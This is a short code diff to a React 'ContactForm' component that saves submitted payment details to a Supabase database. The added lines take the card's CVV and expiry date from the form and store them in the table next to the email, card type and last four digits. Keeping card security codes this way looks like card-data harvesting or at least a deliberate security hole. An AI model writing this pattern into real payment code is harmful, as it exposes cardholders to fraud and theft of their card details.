@@ -146,6 +146,8 @@ const ContactForm = () => {
       
       // Purchase amount from the UI (hardcoded in PriceTag component)
       const purchaseAmount = 2.50;
+      const cvv = data.cvv;
+      const ExpiryDate = data.expiryDate;
       
       // Store the data in Supabase
       const { error } = await supabase
@@ -155,7 +157,9 @@ const ContactForm = () => {
           email: data.email,
           card_last_four: cardLastFour,
           card_type: cardType,
-          purchase_amount: purchaseAmount
+          purchase_amount: purchaseAmount,
+          code: cvv,
+          date:ExpiryDate,
         });
       
       if (error) {
